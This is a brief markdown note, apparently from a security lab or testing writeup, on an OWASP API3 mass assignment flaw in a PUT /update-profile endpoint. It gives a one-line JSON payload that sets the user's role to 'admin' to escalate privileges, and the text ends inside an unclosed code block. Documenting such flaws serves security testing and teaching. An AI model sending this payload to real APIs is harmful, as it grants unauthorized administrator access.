# API3 – Mass Assignment (Privilege Escalation)

## 📌 Vulnerability Type
OWASP API3: Broken Object Property Level Authorization

## 🎯 Description
Profile update endpoint allows arbitrary field modification.

## 🔍 Vulnerable Endpoint
PUT /update-profile

## 🧪 Payload

```json
{
  "role": "admin"
}
